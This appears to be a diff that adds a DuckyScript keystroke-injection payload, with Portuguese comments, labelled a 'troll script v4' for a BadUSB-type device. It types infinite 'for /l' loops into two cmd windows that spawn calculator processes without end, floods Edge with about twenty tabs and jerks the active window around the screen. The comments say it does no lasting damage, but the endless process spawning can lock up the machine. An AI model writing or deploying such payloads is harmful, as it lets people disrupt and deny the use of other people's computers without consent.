@@ -1,0 +1,92 @@
+REM Troll script v4 - rapido e caotico, mas ainda sem persistencia/dano real.
+REM O loop de calculadoras e INFINITO de proposito. Pra parar: Ctrl+Shift+Esc
+REM (Gerenciador de Tarefas) e finalizar os processos "cmd.exe", ou reiniciar o PC.
+REM Nao mexe em resolucao/orientacao de tela, wallpaper, nem apaga/instala nada.
+DELAY 800
+DEFAULT_DELAY 20
+
+REM --- Bomba de calculadoras infinita: abre o cmd primeiro, digita o loop DENTRO dele ---
+REM (o Run do Windows expande % antes de rodar, entao digitar o comando direto no Run
+REM quebra o "for /l"; digitando dentro do cmd ja aberto isso nao acontece)
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 700
+STRING for /l %i in (1,0,2) do start calc.exe
+ENTER
+DELAY 300
+
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 700
+STRING for /l %i in (1,0,2) do start calc.exe
+ENTER
+DELAY 300
+
+REM --- Enquanto isso, navegador lotando de abas ---
+GUI r
+DELAY 400
+STRING msedge
+ENTER
+DELAY 1500
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+CTRL t
+DELAY 100
+
+REM --- Janela ativa "descontrolada" pelos cantos da tela ---
+GUI LEFT
+DELAY 200
+GUI UP
+DELAY 200
+GUI RIGHT
+DELAY 200
+GUI DOWN
+DELAY 200
+GUI LEFT
+DELAY 200
+GUI RIGHT
+DELAY 200
+GUI UP
+DELAY 200
+GUI DOWN
+DELAY 200
